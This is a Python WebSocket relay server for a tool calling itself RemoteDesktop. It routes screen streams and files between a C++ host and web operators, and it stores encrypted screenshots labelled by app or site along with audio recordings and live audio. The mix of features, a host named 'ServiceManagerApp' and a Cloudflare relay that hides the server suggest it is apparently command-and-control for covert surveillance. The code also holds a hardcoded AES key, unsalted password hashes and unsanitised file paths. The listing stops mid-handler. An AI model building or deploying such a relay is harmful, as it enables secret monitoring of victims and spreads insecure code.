#!/usr/bin/env python3
"""
RemoteDesktop VPS Server - WebSocket Relay
Bridges C++ host <--> Web client
Version: 2024-03-12-v3 (stream throttle + diagnostics)
"""
SERVER_VERSION = "1.0.138"

import asyncio
import websockets
import json
import logging
import hashlib
import secrets
import time
import ssl
import os
import base64
import socket
import struct
import glob as glob_module
from typing import Dict, Optional, Set
from pathlib import Path
from dataclasses import dataclass, field

# ─── AES-256-CBC Encryption (compatible with ServiceManagerApp / C++ host) ──
AES_KEY = bytes([0x3A,0x7F,0x21,0x94,0xC5,0xD2,0x6B,0x11,0x8E,0x4C,0xF9,0x53,0x07,0xB8,0xDA,0x62,
                 0x19,0xAF,0x33,0xE4,0x5D,0x70,0x88,0x9B,0xC1,0x2E,0x47,0x6A,0x8D,0x90,0xAB,0xCD])
AES_IV  = bytes([0x12,0x34,0x56,0x78,0x9A,0xBC,0xDE,0xF0,0x0F,0x1E,0x2D,0x3C,0x4B,0x5A,0x69,0x78])

def _aes_decrypt(data: bytes) -> bytes:
    """AES-256-CBC decrypt with PKCS7 unpadding. Pure Python (no deps)."""
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import padding as sym_padding
        cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV))
        dec = cipher.decryptor()
        padded = dec.update(data) + dec.finalize()
        unpadder = sym_padding.PKCS7(128).unpadder()
        return unpadder.update(padded) + unpadder.finalize()
    except ImportError:
        # Fallback: pure Python AES (minimal, for when cryptography not installed)
        log.warning("cryptography package not installed, cannot decrypt screenshots")
        return data

def _decrypt_filename(enc_b64: str) -> str:
    """Decrypt URL-safe Base64 filename back to plaintext."""
    # Restore standard Base64
    s = enc_b64.replace('_', '/').replace('-', '+')
    # Add padding
    while len(s) % 4 != 0:
        s += '='
    try:
        enc_bytes = base64.b64decode(s)
        dec_bytes = _aes_decrypt(enc_bytes)
        return dec_bytes.decode('utf-8')
    except Exception:
        return enc_b64  # Return as-is if decryption fails

# ─── Screenshot Storage ──────────────────────────────────────────────────────
SCREENSHOT_DIR = Path(os.environ.get("RDP_SCREENSHOT_DIR", "/opt/remotedesk/screenshots"))
SCREENSHOT_QUOTA = int(os.environ.get("RDP_SCREENSHOT_QUOTA", 500_000_000))  # 500MB default
SCREENSHOT_TEMPLATES_FILE = SCREENSHOT_DIR / "_templates.json"

# Audio recording storage
AUDIO_DIR = Path(os.environ.get("RDP_AUDIO_DIR", "/opt/remotedesk/audio"))
AUDIO_QUOTA = int(os.environ.get("RDP_AUDIO_QUOTA", 500_000_000))  # 500MB default

def _ensure_screenshot_dir(token: str) -> Path:
    d = SCREENSHOT_DIR / token
    d.mkdir(parents=True, exist_ok=True)
    return d

def _get_screenshot_dir_size(d: Path) -> int:
    return sum(f.stat().st_size for f in d.iterdir() if f.is_file() and f.suffix == '.jpg')

def _get_quota_for_dir(d: Path) -> int:
    """Read saved quota from _quota.txt, or use global default."""
    quota_file = d / "_quota.txt"
    if quota_file.exists():
        try:
            mb = int(quota_file.read_text().strip())
            return mb * 1_000_000
        except:
            pass
    # Also check parent dir (in case d is the token subdir)
    parent_quota = d.parent / "_quota.txt"
    if parent_quota.exists():
        try:
            return int(parent_quota.read_text().strip()) * 1_000_000
        except:
            pass
    return SCREENSHOT_QUOTA

def _get_app_quotas(d: Path) -> dict:
    """Read per-app quotas from _app_quotas.json"""
    qf = d / "_app_quotas.json"
    if qf.exists():
        try: return json.loads(qf.read_text())
        except: pass
    return {}

def _save_app_quotas(d: Path, quotas: dict):
    d.mkdir(parents=True, exist_ok=True)
    (d / "_app_quotas.json").write_text(json.dumps(quotas, indent=2))

def _get_app_from_filename(name: str) -> str:
    """Extract app/site name from screenshot filename: YYYYMMDD_HHMMSS_AppName"""
    parts = name.replace('.jpg', '').split('_')
    return '_'.join(parts[2:]) if len(parts) > 2 else 'Desktop'

def _enforce_quota(d: Path, quota: int = 0):
    """Enforce quota PER CATEGORY. Each app/site gets the same quota limit."""
    if quota <= 0:
        quota = _get_quota_for_dir(d)

    all_files = [f for f in d.iterdir() if f.is_file() and f.suffix == '.jpg']

    # Group files by app/site category
    app_files = {}
    for f in all_files:
        app = _get_app_from_filename(f.stem)
        if app not in app_files: app_files[app] = []
        app_files[app].append(f)

    # Apply same quota to EACH category separately
    for app, files in app_files.items():
        files.sort(key=lambda f: f.stat().st_mtime)
        total = sum(f.stat().st_size for f in files)
        while total > quota and files:
            oldest = files.pop(0)
            total -= oldest.stat().st_size
            oldest.unlink(missing_ok=True)
            log.info(f"Quota [{app}]: deleted {oldest.name}, {total//1024}KB/{quota//1024}KB")

def _save_screenshot(token: str, enc_name: str, enc_data: bytes) -> Optional[str]:
    """Decrypt and save screenshot. Returns decrypted filename or None."""
    try:
        d = _ensure_screenshot_dir(token)
        plain_name = _decrypt_filename(enc_name)
        plain_data = _aes_decrypt(enc_data)
        if not plain_data or len(plain_data) < 100:
            log.warning(f"Screenshot decrypt failed or too small: name={enc_name[:30]} data_len={len(enc_data)} decrypted={len(plain_data) if plain_data else 0}")
            return None
        safe_name = "".join(c for c in plain_name if c.isalnum() or c in ' _-').strip()
        if not safe_name:
            safe_name = f"shot_{int(time.time())}"
        fpath = d / f"{safe_name}.jpg"
        # Avoid overwrite
        if fpath.exists():
            fpath = d / f"{safe_name}_{int(time.time()*1000)%10000}.jpg"
        fpath.write_bytes(plain_data)
        _enforce_quota(d)
        log.info(f"Screenshot saved: {safe_name} ({len(plain_data)//1024}KB) quota_dir={d}")
        return safe_name
    except Exception as e:
        log.error(f"Screenshot save error: {e}")
        return None

def _list_screenshots(token: str) -> list:
    """List all screenshots for a room token."""
    d = SCREENSHOT_DIR / token
    if not d.exists():
        return []
    files = sorted([f for f in d.iterdir() if f.is_file() and f.suffix == '.jpg'],
                   key=lambda f: f.stat().st_mtime, reverse=True)
    result = []
    for f in files:
        st = f.stat()
        result.append({
            "name": f.stem,
            "size": st.st_size,
            "time": int(st.st_mtime),
            "downloaded": False,  # TODO: track in metadata
        })
    return result

def _make_thumbnail(fpath: Path, max_size: int = 200) -> bytes:
    """Create JPEG thumbnail. Uses PIL if available, otherwise returns full image."""
    try:
        from PIL import Image
        import io
        img = Image.open(fpath)
        img.thumbnail((max_size, max_size))
        buf = io.BytesIO()
        img.save(buf, format='JPEG', quality=60)
        return buf.getvalue()
    except ImportError:
        # No PIL — return full file (client will resize)
        return fpath.read_bytes()

def _load_templates() -> dict:
    if SCREENSHOT_TEMPLATES_FILE.exists():
        try:
            return json.loads(SCREENSHOT_TEMPLATES_FILE.read_text())
        except Exception:
            pass
    return {}

def _save_templates(templates: dict):
    SCREENSHOT_TEMPLATES_FILE.parent.mkdir(parents=True, exist_ok=True)
    SCREENSHOT_TEMPLATES_FILE.write_text(json.dumps(templates, indent=2))

# ─── Audio Recording Storage ─────────────────────────────────────────────────
def _ensure_audio_dir(token: str) -> Path:
    d = AUDIO_DIR / token
    d.mkdir(parents=True, exist_ok=True)
    return d

def _save_audio(token: str, enc_name: str, enc_data: bytes) -> Optional[str]:
    """Decrypt and save audio recording."""
    try:
        d = _ensure_audio_dir(token)
        plain_name = _decrypt_filename(enc_name)
        plain_data = _aes_decrypt(enc_data)
        if not plain_data or len(plain_data) < 100:
            log.warning(f"Audio decrypt failed: name={enc_name[:30]} data={len(enc_data)}")
            return None
        safe_name = "".join(c for c in plain_name if c.isalnum() or c in ' _-').strip()
        if not safe_name: safe_name = f"audio_{int(time.time())}"
        fpath = d / f"{safe_name}.ogg"
        if fpath.exists(): fpath = d / f"{safe_name}_{int(time.time()*1000)%10000}.ogg"
        fpath.write_bytes(plain_data)
        # Enforce quota
        _enforce_audio_quota(d)
        log.info(f"Audio saved: {safe_name} ({len(plain_data)//1024}KB)")
        return safe_name
    except Exception as e:
        log.error(f"Audio save error: {e}")
        return None

def _list_audio(token: str) -> list:
    d = AUDIO_DIR / token
    if not d.exists(): return []
    files = sorted([f for f in d.iterdir() if f.is_file() and f.suffix in ('.ogg', '.aac', '.opus', '.mp3', '.wav')],
                   key=lambda f: f.stat().st_mtime, reverse=True)
    return [{"name": f.stem, "ext": f.suffix, "size": f.stat().st_size, "time": int(f.stat().st_mtime)} for f in files]

def _get_audio_quota(d: Path) -> int:
    qf = d / "_quota.txt"
    if qf.exists():
        try: return int(qf.read_text().strip()) * 1_000_000
        except: pass
    return AUDIO_QUOTA

def _enforce_audio_quota(d: Path):
    quota = _get_audio_quota(d)
    files = sorted([f for f in d.iterdir() if f.is_file() and f.suffix in ('.ogg', '.aac', '.opus', '.mp3', '.wav')],
                   key=lambda f: f.stat().st_mtime)
    total = sum(f.stat().st_size for f in files)
    while total > quota and files:
        oldest = files.pop(0)
        total -= oldest.stat().st_size
        oldest.unlink(missing_ok=True)
        log.info(f"Audio quota: deleted {oldest.name}, {total//1024}KB/{quota//1024}KB")

# ─── Logging ────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s - %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("vps_server.log"),
    ],
)
log = logging.getLogger("rdp_server")


class _SuppressHandshakeTraceback(logging.Filter):
    """Hide websockets.server ERROR traceback when it's our known proxy (Sec-WebSocket-Key) error."""
    def filter(self, record):
        if record.name != "websockets.server":
            return True
        if record.levelno != logging.ERROR:
            return True
        try:
            msg = record.getMessage()
        except Exception:
            msg = str(record.msg)
        if "opening handshake failed" in msg:
            return False
        return True


logging.getLogger("websockets.server").addFilter(_SuppressHandshakeTraceback())

# ─── Fix Connection: keep-alive → Upgrade for proxies (426) ───────────────────
# Message shown when proxy strips Sec-WebSocket-Key (cannot be fixed in app — proxy must forward headers)
PROXY_WS_HINT = (
    "Missing Sec-WebSocket-Key: your reverse proxy is stripping WebSocket headers. "
    "Configure the proxy to forward: Upgrade, Connection, Sec-WebSocket-Key, Sec-WebSocket-Version. "
    "Example (nginx): proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \"Upgrade\";"
)


def _install_connection_header_fix():
    """Ensure protocol.process_request sees Connection: Upgrade when proxy sent keep-alive."""
    try:
        from websockets import server as ws_server
        from websockets import headers as ws_headers
        from websockets.http11 import Request
        from websockets.datastructures import Headers
        from websockets.exceptions import InvalidHeader, InvalidHandshake
        orig = ws_server.ServerProtocol.process_request

        def process_request(self, request):
            connection = sum(
                [ws_headers.parse_connection(v) for v in request.headers.get_all("Connection")],
                [],
            )
            # Fix when proxy sends Connection: keep-alive, close, or other (no "upgrade").
            if not any(v.lower() == "upgrade" for v in connection):
                new_headers = Headers()
                for name, value in request.headers.raw_items():
                    new_headers[name] = value
                try:
                    del new_headers["Connection"]
                except KeyError:
                    pass
                new_headers["Connection"] = "Upgrade"
                upgrade_vals = new_headers.get_all("Upgrade")
                if not upgrade_vals or "websocket" not in (upgrade_vals[0] or "").lower():
                    try:
                        del new_headers["Upgrade"]
                    except KeyError:
                        pass
                    new_headers["Upgrade"] = "websocket"
                request = Request(
                    path=request.path,
                    headers=new_headers,
                    _exception=getattr(request, "_exception", None),
                )
            try:
                return orig(self, request)
            except InvalidHeader as e:
                if "Sec-WebSocket-Key" in str(e):
                    log.warning(
                        "WebSocket rejected: proxy is not forwarding Sec-WebSocket-Key. "
                        "Run on server: sudo bash deploy-web.sh && sudo systemctl reload nginx. "
                        "If using Cloudflare: enable WebSockets in Network settings."
                    )
                    raise InvalidHandshake(PROXY_WS_HINT) from None
                raise
        ws_server.ServerProtocol.process_request = process_request
        log.info("WebSocket: Connection header fix installed (proxy keep-alive -> Upgrade)")
    except Exception as e:
        log.warning("WebSocket Connection header fix not installed: %s", e)

_install_connection_header_fix()


def _install_http10_reject():
    """On HTTP/1.0 or invalid request, send 400 and close instead of traceback (expected HTTP/1.1)."""
    from websockets.exceptions import InvalidMessage

    def _send_400_and_close(transport):
        try:
            if transport and not getattr(transport, "is_closing", lambda: False)():
                transport.write(
                    b"HTTP/1.1 400 Bad Request\r\n"
                    b"Connection: close\r\n"
                    b"Content-Type: text/plain; charset=utf-8\r\n"
                    b"Content-Length: 72\r\n\r\n"
                    b"WebSocket requires HTTP/1.1. Use the web page on port 80, not 8080."
                )
                transport.close()
        except Exception:
            pass
        log.warning(
            "Rejected invalid request (HTTP/1.0, HTTP/2, or bad). Use nginx with proxy_http_version 1.1 and forward Sec-WebSocket-Key, Sec-WebSocket-Version, Upgrade, Connection."
        )

    def _is_http10_error(e):
        msg = str(e)
        return (
            ("unsupported protocol" in msg and "expected HTTP/1.1" in msg)
            or "HTTP/1.0" in msg
            or "PRI " in msg
            or "HTTP/2.0" in msg
            or ("did not receive a valid HTTP request" in msg and "expected GET" not in msg and "unsupported HTTP method" not in msg)
        )

    def _is_wrong_method(e):
        msg = str(e)
        return "expected GET" in msg or "unsupported HTTP method" in msg

    def _reject_and_raise(transport):
        _send_400_and_close(transport)
        raise InvalidMessage("HTTP/1.0 not supported")

    # websockets 13+: handshake is on ServerConnection (asyncio.server)
    patched = False
    try:
        from websockets.asyncio import server as ws_async_server
        Conn = getattr(ws_async_server, "ServerConnection", None) or getattr(ws_async_server, "WebSocketServerProtocol", None)
        if Conn and hasattr(Conn, "handshake"):
            _orig = Conn.handshake
            async def _wrap(self, *args, _orig=_orig, **kwargs):
                try:
                    return await _orig(self, *args, **kwargs)
                except InvalidMessage as e:
                    msg = str(e)
                    if _is_wrong_method(e):
                        _send_400_and_close(getattr(self, "transport", None))
                        log.warning("Rejected: WebSocket handshake requires GET (got POST or other).")
                        return
                    if _is_http10_error(e):
                        _reject_and_raise(getattr(self, "transport", None))
                    raise
            Conn.handshake = _wrap
            patched = True
            log.info("WebSocket: HTTP/1.0 rejection handler installed (ServerConnection)")
    except (ImportError, AttributeError):
        pass
    if patched:
        return
    try:
        from websockets.legacy import server as ws_legacy
        Conn = getattr(ws_legacy, "ServerConnection", None) or getattr(ws_legacy, "WebSocketServerProtocol", None)
        if Conn and hasattr(Conn, "handshake"):
            _orig = Conn.handshake
            async def _wrap(self, *args, _orig=_orig, **kwargs):
                try:
                    return await _orig(self, *args, **kwargs)
                except InvalidMessage as e:
                    if _is_wrong_method(e):
                        _send_400_and_close(getattr(self, "transport", None))
                        log.warning("Rejected: WebSocket handshake requires GET (got POST or other).")
                        return
                    if _is_http10_error(e):
                        _reject_and_raise(getattr(self, "transport", None))
                    raise
            Conn.handshake = _wrap
            patched = True
            log.info("WebSocket: HTTP/1.0 rejection handler installed (legacy)")
    except (ImportError, AttributeError):
        pass

    # Fallback: websockets <13 or different layout — ServerProtocol.handshake
    if not patched:
        try:
            from websockets import server as ws_server
            if hasattr(ws_server.ServerProtocol, "handshake"):
                _orig = ws_server.ServerProtocol.handshake
                async def _wrap_proto(self, *args, **kwargs):
                    try:
                        return await _orig(self, *args, **kwargs)
                    except InvalidMessage as e:
                        if _is_http10_error(e):
                            _reject_and_raise(getattr(self, "transport", None))
                        raise
                ws_server.ServerProtocol.handshake = _wrap_proto
                patched = True
                log.info("WebSocket: HTTP/1.0 rejection handler installed (ServerProtocol)")
        except Exception:
            pass

    if not patched:
        log.debug("WebSocket: HTTP/1.0 rejection not installed (no handshake found); asyncio handler will log rejects")


_install_http10_reject()

# ─── Config ─────────────────────────────────────────────────────────────────
HOST = os.environ.get("RDP_HOST", "0.0.0.0")
PORT = int(os.environ.get("RDP_PORT", "8080"))
ADMIN_TOKEN = os.environ.get("RDP_ADMIN_TOKEN", "change-me-admin-token")
# Cloudflare Worker relay secret: if set, server ONLY accepts connections
# that carry the matching X-Relay-Secret header (set by worker.js).
# Direct connections to VPS (bypassing Cloudflare) will be rejected.
# Leave empty ("") to disable the check (no Cloudflare / direct connections allowed).
RELAY_SECRET = os.environ.get("RDP_RELAY_SECRET", "")
MAX_ROOMS = int(os.environ.get("RDP_MAX_ROOMS", "100"))
MAX_CLIENTS_PER_ROOM = int(os.environ.get("RDP_MAX_CLIENTS", "10"))
PING_INTERVAL = 10   # 10s ping interval (2s was too aggressive, wasted event loop time during file transfers)
PING_TIMEOUT = 120
SSL_CERT = os.environ.get("RDP_SSL_CERT", "")
SSL_KEY  = os.environ.get("RDP_SSL_KEY", "")

# ─── Data Structures ────────────────────────────────────────────────────────
@dataclass
class Connection:
    ws: object
    role: str           # "host" | "client" | "stream"
    token: str
    user_id: str = ""
    remote: str = ""
    connected_at: float = field(default_factory=time.time)
    bytes_sent: int = 0
    bytes_recv: int = 0
    msg_count: int = 0

@dataclass
class Room:
    token: str
    password_hash: str
    host: Optional[Connection] = None
    clients: Dict[str, Connection] = field(default_factory=dict)
    stream_clients: Dict[str, Connection] = field(default_factory=dict)  # SCRN-only connections (client→receive)
    host_streams: Dict[str, Connection] = field(default_factory=dict)  # Host stream senders (host→send SCRN)
    file_clients: Dict[str, Connection] = field(default_factory=dict)  # file_recv connections (dedicated file channel)
    _file_rr: int = 0  # Round-robin index for distributing FILE chunks across file_recv connections
    created_at: float = field(default_factory=time.time)
    last_activity: float = field(default_factory=time.time)
    frame_count: int = 0
    # Total stream stats (across ALL stream connections)
    _total_frames_in: int = 0
    _total_frames_out: int = 0
    _total_frames_dropped: int = 0
    _total_bytes_out: int = 0
    _total_stats_time: float = field(default_factory=time.time)
    _pending_binary_targets: list = field(default_factory=list)  # Queue of targets for pipelined binary routing
    _pending_file_targets: list = field(default_factory=list)    # Queue of targets for host_file → file_recv routing

    def is_full(self) -> bool:
        return len(self.clients) >= MAX_CLIENTS_PER_ROOM

    def touch(self):
        self.last_activity = time.time()

# In-memory room registry
rooms: Dict[str, Room] = {}
rooms_lock = asyncio.Lock()

# ─── Auth helpers ────────────────────────────────────────────────────────────
def hash_password(pw: str) -> str:
    return hashlib.sha256(pw.encode()).hexdigest()

def check_password(plain: str, hashed: str) -> bool:
    if not hashed:   # no password set → allow
        return True
    return hash_password(plain) == hashed

def new_user_id() -> str:
    return secrets.token_hex(8)

# ─── JSON helpers ─────────────────────────────────────────────────────────────
def make_error(msg: str, req_id: str = "") -> str:
    return json.dumps({"ok": False, "error": msg, "id": req_id})

def make_ok(data, req_id: str = "") -> str:
    return json.dumps({"ok": True, "data": data, "id": req_id})

def make_event(event: str, data) -> str:
    return json.dumps({"event": event, "data": data})

# ─── Room management ─────────────────────────────────────────────────────────
async def get_or_create_room(token: str, password: str = "", role: str = "client") -> Room:
    async with rooms_lock:
        if token not in rooms:
            if len(rooms) >= MAX_ROOMS:
                raise ValueError("Server at room capacity")
            rooms[token] = Room(
                token=token,
                password_hash=hash_password(password) if password else "",
            )
            log.info(f"Room created: {token}")
        elif role == "host" and password:
            # Host reconnects with new password — update the room's password
            rooms[token].password_hash = hash_password(password)
        return rooms[token]

async def cleanup_empty_rooms():
    """Periodically remove stale rooms with no host for >5 min"""
    while True:
        await asyncio.sleep(60)
        async with rooms_lock:
            stale = [
                t for t, r in rooms.items()
                if r.host is None and (time.time() - r.last_activity) > 300
            ]
            for t in stale:
                del rooms[t]
                log.info(f"Room removed (stale): {t}")

# ─── WebSocket handler ───────────────────────────────────────────────────────
async def handler(websocket, path: str):
    remote = websocket.remote_address
    log.info(f"New connection from {remote} path={path}")

    # ── Cloudflare Worker relay secret check ──────────────────────────────────
    # If RELAY_SECRET is configured, reject any connection that doesn't carry
    # the matching X-Relay-Secret header. This blocks direct access to the VPS
    # port and ensures all traffic passes through the Cloudflare Worker.
    if RELAY_SECRET:
        try:
            incoming_secret = websocket.request_headers.get("X-Relay-Secret", "")
        except Exception:
            incoming_secret = ""
        if incoming_secret != RELAY_SECRET:
            log.warning(f"Rejected connection from {remote}: missing or wrong X-Relay-Secret")
            await websocket.close(1008, "Forbidden")
            return

    # ── TCP buffer optimization: large buffers + no-delay for throughput ──
    _sock = None
    try:
        _sock = websocket.transport.get_extra_info("socket")
        if _sock:
            _sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2 * 1024 * 1024)  # 2MB send
            _sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2 * 1024 * 1024)  # 2MB recv
            _sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)              # No Nagle
    except Exception:
        pass

    conn: Optional[Connection] = None
    room: Optional[Room] = None

    try:
        # ── Auth phase ─────────────────────────────────────────────────────
        try:
            raw = await asyncio.wait_for(websocket.recv(), timeout=10)
        except asyncio.TimeoutError:
            await websocket.send(make_error("Auth timeout"))
            return
        
        try:
            msg = json.loads(raw)
        except json.JSONDecodeError:
            await websocket.send(make_error("Invalid JSON"))
            return
        
        if msg.get("cmd") != "auth":
            await websocket.send(make_error("Expected auth command"))
            return
        
        token    = str(msg.get("token", "")).strip()
        password = str(msg.get("password", ""))
        role     = str(msg.get("role", "client"))
        
        if not token:
            await websocket.send(make_error("Missing token"))
            return
        
        if role not in ("host", "client", "stream", "host_stream", "host_file", "file_recv"):
            await websocket.send(make_error("Invalid role"))
            return
        
        try:
            room = await get_or_create_room(token, password if role == "host" else "", role)
        except ValueError as e:
            await websocket.send(make_error(str(e)))
            return
        
        # Password check for clients and stream connections
        if role in ("client", "stream", "file_recv"):
            if not check_password(password, room.password_hash):
                await websocket.send(make_error("Wrong password"))
                log.warning(f"Auth failed from {remote} (wrong password)")
                return
            if role == "client" and room.is_full():
                await websocket.send(make_error("Room full"))
                return

        # host_stream/host_file uses same password as host (already set when host connected)
        if role in ("host_stream", "host_file"):
            if not check_password(password, room.password_hash):
                await websocket.send(make_error("Wrong password"))
                log.warning(f"Auth failed from {remote} ({role} wrong password)")
                return
        
        # Register connection
        user_id = new_user_id()
        conn = Connection(
            ws=websocket,
            role=role,
            token=token,
            user_id=user_id,
            remote=str(remote),
        )
        
        async with rooms_lock:
            if role == "host":
                old_host = room.host
                room.host = conn
                # Don't close old host WS — let it die naturally
                # Closing it causes the host to see CLOSE frame → reconnect loop
                # host_online notification sent after lock release (line 707)
            elif role == "host_stream":
                room.host_streams[user_id] = conn
            elif role == "host_file":
                room.host_streams[user_id] = conn  # Reuse host_streams dict for host_file
            elif role == "stream":
                room.stream_clients[user_id] = conn
            elif role == "file_recv":
                conn._parent_client = msg.get("parent_client", "")
                room.file_clients[user_id] = conn
            else:
                room.clients[user_id] = conn
            room.touch()
        
        # Notify
        await websocket.send(json.dumps({
            "ok": True, "event": "auth_ok",
            "user_id": user_id,
            "role": role,
            "host_online": room.host is not None,
            "server_version": SERVER_VERSION,
        }))
        
        log.info(f"Auth OK: role={role} token={token[:8]}... id={user_id} from={remote}")

        # Set TCP priority and buffer sizes per role
        if _sock:
            try:
                if role in ("stream", "host_stream"):
                    _sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0x10)  # IPTOS_LOWDELAY
                    # Small send buffer for stream — pacing handles smoothing,
                    # small buffer = less latency, frames don't queue up
                    _sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 128 * 1024)
                elif role in ("file_recv", "host_file"):
                    _sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0x08)  # IPTOS_THROUGHPUT
                    # Large buffer for files — maximize throughput
                    _sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
            except Exception:
                pass
        
        # Notify clients that host came online
        if role == "host":
            await broadcast_to_clients(room, make_event("host_online", {"user_id": user_id}))
        # Notify host that a client joined (not for stream-only connections)
        if role == "client" and room.host:
            try:
                await room.host.ws.send(make_event("client_joined", {"user_id": user_id}))
            except:
                pass
        # Notify ALL clients about current client count (for "another operator online" badge)
        if role == "client":
            n = len(room.clients)
            await broadcast_to_clients(room, make_event("clients_online", {"count": n}))
        
        # ── Message relay loop ─────────────────────────────────────────────
        async for raw_msg in websocket:
            conn.msg_count += 1
            room.touch()
            
            if isinstance(raw_msg, bytes):
                conn.bytes_recv += len(raw_msg)
                if role == "client" and room.host:
                    # Binary from client (FILE upload chunks) → forward to host
                    # BLOCKING: backpressure is correct for files — rate-limits sender
                    try:
                        await room.host.ws.send(raw_msg)
                        room.host.bytes_sent += len(raw_msg)
                    except:
                        log.warning("Failed to forward binary to host")
                elif role == "host_stream":
                    # host_stream ONLY sends SCRN/SCR2 frames → route to stream clients
                    if len(raw_msg) >= 4 and raw_msg[:4] in (b'SCRN', b'SCR2'):
                        enqueue_scrn_to_stream_clients(room, raw_msg)
                elif role == "host_file":
                    # host_file sends FILE chunks → round-robin to file_recv clients
                    fc_list = list(room.file_clients.values())
                    if fc_list:
                        idx = room._file_rr % len(fc_list)
                        room._file_rr += 1
                        fc = fc_list[idx]
                        try:
                            await fc.ws.send(raw_msg)
                            fc.bytes_sent += len(raw_msg)
                        except:
                            room.file_clients.pop(fc.user_id, None)
                        # File throughput diagnostics (every 5 seconds)
                        if not hasattr(conn, '_file_bytes'): conn._file_bytes = 0; conn._file_log = time.time(); conn._file_chunks = 0
                        conn._file_bytes += len(raw_msg)
                        conn._file_chunks += 1
                        now = time.time()
                        if now - conn._file_log >= 5.0:
                            elapsed = now - conn._file_log
                            kbps = conn._file_bytes / elapsed / 1024
                            log.info(f"FILE relay: {kbps:.0f} KB/s, {conn._file_chunks} chunks in {elapsed:.1f}s, chunk={len(raw_msg)//1024}KB, file_conns={len(fc_list)}")
                            conn._file_bytes = 0; conn._file_chunks = 0; conn._file_log = now
                    else:
                        if conn.msg_count <= 2:
                            log.warning(f"host_file: no file_recv clients, dropping FILE binary")
                elif role == "host":
                    if len(raw_msg) >= 4 and raw_msg[:4] in (b'SCRN', b'SCR2'):
                        # SCRN frames → ONLY to stream_clients, NOT to command clients
                        # Fire-and-forget: never blocks the host handler
                        enqueue_scrn_to_stream_clients(room, raw_msg)
                    elif len(raw_msg) >= 8 and raw_msg[:4] == b'SHOT':
                        # Screenshot from host → decrypt + save to disk + notify clients
                        name_len = struct.unpack('<I', raw_msg[4:8])[0]
                        if name_len > 0 and 8 + name_len < len(raw_msg):
                            enc_name = raw_msg[8:8+name_len].decode('utf-8', errors='replace')
                            enc_data = raw_msg[8+name_len:]
                            saved_name = _save_screenshot(room.token, enc_name, enc_data)
                            if saved_name:
                                # Notify all command clients
                                d = _ensure_screenshot_dir(room.token)
                                fpath = None
                                for f in d.iterdir():
                                    if f.stem == saved_name:
                                        fpath = f; break
                                notify = json.dumps({"event": "new_screenshot", "name": saved_name,
                                    "size": fpath.stat().st_size if fpath else 0,
                                    "time": int(time.time())})
                                await broadcast_to_clients(room, notify)
                                log.debug(f"Screenshot saved: {saved_name} ({len(enc_data)} bytes)")
                    elif len(raw_msg) >= 4 and raw_msg[:4] == b'ALIV':
                        # Live audio: relay directly to all command clients (no storage)
                        await broadcast_to_clients(room, raw_msg)
                    elif len(raw_msg) >= 8 and raw_msg[:4] == b'AUDR':
                        # Audio recording from host → decrypt + save + notify clients
                        name_len = struct.unpack('<I', raw_msg[4:8])[0]
                        if name_len > 0 and 8 + name_len < len(raw_msg):
                            enc_name = raw_msg[8:8+name_len].decode('utf-8', errors='replace')
                            enc_data = raw_msg[8+name_len:]
                            saved_name = _save_audio(room.token, enc_name, enc_data)
                            if saved_name:
                                d = _ensure_audio_dir(room.token)
                                fpath = None
                                for f in d.iterdir():
                                    if f.stem == saved_name:
                                        fpath = f; break
                                notify = json.dumps({"event": "new_recording", "name": saved_name,
                                    "ext": fpath.suffix if fpath else ".aac",
                                    "size": fpath.stat().st_size if fpath else 0,
                                    "time": int(time.time())})
                                await broadcast_to_clients(room, notify)
                    elif len(raw_msg) >= 4 and raw_msg[:4] == b'FILE' and room.file_clients:
                        # FILE binary from host main ws → round-robin to file_recv clients
                        fc_list = list(room.file_clients.values())
                        idx = room._file_rr % len(fc_list)
                        room._file_rr += 1
                        fc = fc_list[idx]
                        try:
                            await fc.ws.send(raw_msg)
                            fc.bytes_sent += len(raw_msg)
                        except:
                            room.file_clients.pop(fc.user_id, None)
                    else:
                        # Non-FILE binary or no file_recv clients → route via target queue or broadcast
                        target = ""
                        if room._pending_binary_targets:
                            target = room._pending_binary_targets.pop(0)
                        if target and target in room.clients:
                            try:
                                await room.clients[target].ws.send(raw_msg)
                                room.clients[target].bytes_sent += len(raw_msg)
                            except:
                                pass
                        else:
                            await broadcast_to_clients(room, raw_msg)
                # role == "stream" sends nothing to host
            else:
                # Text JSON: route by role
                conn.bytes_recv += len(raw_msg.encode())
                if role in ("stream", "host_stream", "host_file", "file_recv"):
                    continue  # No text forwarding for stream/file channels
                try:
                    msg = json.loads(raw_msg)
                except:
                    continue
                
                if role == "client":
                    # Screenshot commands: handled by VPS directly
                    sc_cmd = msg.get("cmd", "")
                    if sc_cmd == "screenshot_list":
                        items = _list_screenshots(room.token)
                        resp = json.dumps({"id": msg.get("id",""), "ok": True, "data": {"cmd":"screenshot_list_result","items":items}})
                        await websocket.send(resp)
                        continue
                    elif sc_cmd == "screenshot_thumb":
                        name = msg.get("name", "")
                        d = SCREENSHOT_DIR / room.token
                        fpath = d / f"{name}.jpg"
                        if fpath.exists():
                            thumb = _make_thumbnail(fpath)
                            # Send as binary: STMB + name_len(4) + name + jpeg_thumb
                            name_bytes = name.encode('utf-8')
                            header = b'STMB' + struct.pack('<I', len(name_bytes)) + name_bytes
                            await websocket.send(header + thumb)
                        else:
                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Not found"}))
                        continue
                    elif sc_cmd == "screenshot_view":
                        name = msg.get("name", "")
                        d = SCREENSHOT_DIR / room.token
                        fpath = d / f"{name}.jpg"
                        if fpath.exists():
                            data = fpath.read_bytes()
                            name_bytes = name.encode('utf-8')
                            header = b'SIMG' + struct.pack('<I', len(name_bytes)) + name_bytes
                            await websocket.send(header + data)
                        else:
                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Not found"}))
                        continue
                    elif sc_cmd == "screenshot_download":
